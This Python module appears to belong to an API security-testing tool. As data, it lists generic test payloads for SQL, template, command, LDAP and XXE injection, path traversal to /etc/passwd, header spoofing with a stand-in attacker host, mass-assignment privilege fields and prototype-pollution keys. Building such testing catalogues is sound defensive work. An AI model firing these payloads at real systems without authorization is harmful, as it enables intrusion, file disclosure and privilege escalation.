"""Payload taxonomy.

EXTRACTED CAPABILITY (CAP-004). The source's ten tamper families, with their
payload sets lifted as data and all client values replaced by synthetic ones.

Every payload here is a well-known generic test vector. None derives from any
engagement's data: identifiers are synthetic (``SYNTH-``), hosts use RFC 2606
reserved domains and addresses use RFC 5737 documentation ranges.
"""

# -- injection vectors ---------------------------------------------------
# Each entry: (label, payload, payload_class, severity_if_accepted, note)
INJECTION_VECTORS = [
    ("SQLi-boolean", "' OR '1'='1", "injection", "High",
     "classic boolean tautology"),
    ("SQLi-union", "SYNTH-0001' UNION SELECT NULL--", "injection", "High",
     "union-based extraction probe"),
    ("SQLi-timing", "1';SELECT pg_sleep(0)--", "injection", "High",
     "timing primitive with a zero delay so it cannot cause load"),
    ("XSS-script", "<script>alert(document.domain)</script>", "injection", "High",
     "reflected-context probe"),
    ("XSS-attr", "\" onmouseover=\"1\"", "injection", "Medium",
     "attribute-context break-out"),
    ("Traversal-unix", "../../../../etc/passwd", "injection", "High",
     "path traversal"),
    ("Traversal-encoded", "..%2f..%2f..%2fetc%2fpasswd", "injection", "High",
     "encoded traversal, defeats naive filters"),
    ("CRLF-header", "SYNTH-0001\r\nX-Injected: true", "injection", "High",
     "response/log splitting"),
    ("Template-dollar", "${7*7}", "injection", "High",
     "template expression; evaluation shows as 49"),
    ("Template-hash", "#{7*7}", "injection", "High", "EL expression"),
    ("Template-curly", "{{7*7}}", "injection", "High", "mustache/jinja style"),
    ("Command-semicolon", "SYNTH-0001; id", "injection", "High",
     "command separator"),
    ("Command-backtick", "SYNTH-0001`id`", "injection", "High",
     "command substitution"),
    ("NoSQL-operator", {"$ne": None}, "injection", "High",
     "operator injection via a typed object"),
    ("LDAP-wildcard", "*)(uid=*", "injection", "Medium", "LDAP filter break-out"),
    ("XXE-entity", "<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/hostname\">]><x>&e;</x>",
     "injection", "High", "XML external entity, for XML-accepting endpoints"),
    ("NullByte", "SYNTH-0001\x00.pdf", "injection", "Medium",
     "extension/termination confusion"),
    ("LogForge", "SYNTH-0001\x1b[2Kfake log line", "injection", "Low",
     "terminal escape log forging"),
    ("Unicode-overlong", "SYNTH‮0001", "injection", "Low",
     "bidirectional override"),
]

# -- type confusion ------------------------------------------------------
TYPE_VECTORS = [
    ("integer", 1612026, "Medium"),
    ("float", 1.5, "Low"),
    ("array", ["SYNTH-0001"], "Medium"),
    ("object", {"value": "SYNTH-0001"}, "Medium"),
    ("boolean", True, "Medium"),
    ("null", None, "Medium"),
    ("empty-string", "", "Low"),
    ("whitespace", "   ", "Low"),
]

# -- oversize ------------------------------------------------------------
# Sizes are deliberately modest: these probe whether a limit EXISTS, not how
# much the service can be made to suffer. Anything larger belongs to a
# volumetric/destructive class the scope policy denies by default.
OVERSIZE_VECTORS = [
    ("field-10k", 10_000, "Medium", "10 KB field value"),
    ("field-100k", 100_000, "Medium", "100 KB field value"),
    ("correlation-1k", 1_000, "Low", "1 KB correlation identifier"),
]

NESTING_DEPTH = 200

# -- content types -------------------------------------------------------
CONTENT_TYPES = [
    ("text/plain", "Low"),
    ("application/xml", "Low"),
    ("application/x-www-form-urlencoded", "Low"),
    ("multipart/form-data", "Low"),
    ("application/json; charset=utf-7", "Low"),
    ("", "Low"),
]

# -- methods -------------------------------------------------------------
# TRACE is included because answering it is a misconfiguration worth proving.
UNEXPECTED_METHODS = [
    ("GET", "Medium"), ("PUT", "Medium"), ("DELETE", "High"),
    ("PATCH", "Medium"), ("OPTIONS", "Low"), ("TRACE", "Medium"),
    ("HEAD", "Low"),
]

# -- verb tunnelling -----------------------------------------------------
METHOD_OVERRIDE_HEADERS = [
    ("X-HTTP-Method-Override", "DELETE", "Medium"),
    ("X-Method-Override", "PUT", "Medium"),
    ("X-HTTP-Method", "GET", "Medium"),
]

# -- trust headers -------------------------------------------------------
# RFC 5737 documentation address. A real engagement substitutes the address the
# target is documented to trust, via the profile.
SYNTHETIC_TRUSTED_IP = "192.0.2.10"
SYNTHETIC_EVIL_HOST = "attacker.example.net"

TRUST_HEADERS = [
    ("X-Forwarded-For", SYNTHETIC_TRUSTED_IP, "High"),
    ("X-Real-IP", SYNTHETIC_TRUSTED_IP, "High"),
    ("X-Originating-IP", SYNTHETIC_TRUSTED_IP, "High"),
    ("Client-IP", SYNTHETIC_TRUSTED_IP, "High"),
    ("True-Client-IP", SYNTHETIC_TRUSTED_IP, "High"),
    ("Forwarded", "for=%s" % SYNTHETIC_TRUSTED_IP, "High"),
    ("Host", SYNTHETIC_EVIL_HOST, "Medium"),
    ("X-Forwarded-Host", SYNTHETIC_EVIL_HOST, "Medium"),
]

# -- mass assignment -----------------------------------------------------
MASS_ASSIGNMENT_SETS = [
    ("status/approval fields",
     {"status": "APPROVED", "approvalStatus": "APPROVED", "approved": True,
      "state": "COMPLETE"}, "High"),
    ("privilege fields",
     {"role": "ADMIN", "isAdmin": True, "userRole": "ADMIN", "override": True,
      "permissions": ["*"]}, "High"),
    ("ownership fields",
     {"ownerId": "SYNTH-OWNER-0001", "tenantId": "SYNTH-TENANT-0001",
      "accountId": "SYNTH-ACCT-0001"}, "High"),
    ("accounting fields",
     {"amount": 0, "balance": 999999, "price": 0, "currency": "XTS"}, "High"),
]

# -- prototype / structural --------------------------------------------
POLLUTION_KEYS = ["__proto__", "constructor", "prototype"]

# -- security response headers expected ---------------------------------
EXPECTED_SECURITY_HEADERS = [
    ("Strict-Transport-Security", "High",
     "no HSTS: a downgrade or stripping attack is not prevented"),
    ("X-Content-Type-Options", "Low", "MIME sniffing not disabled"),
    ("X-Frame-Options", "Low", "framing not restricted (or use CSP frame-ancestors)"),
    ("Content-Security-Policy", "Low", "no CSP"),
    ("Referrer-Policy", "Informational", "referrer not constrained"),
    ("Cache-Control", "Low", "caching of an authenticated response not constrained"),
]

DISCOURAGED_RESPONSE_HEADERS = [
    ("Server", "Informational", "server product/version advertised"),
    ("X-Powered-By", "Informational", "framework advertised"),
    ("X-AspNet-Version", "Informational", "framework version advertised"),
]


def injection_vectors(include_xml=False):
    """Injection vectors; XXE excluded unless the endpoint accepts XML."""
    return [v for v in INJECTION_VECTORS
            if include_xml or not v[0].startswith("XXE")]
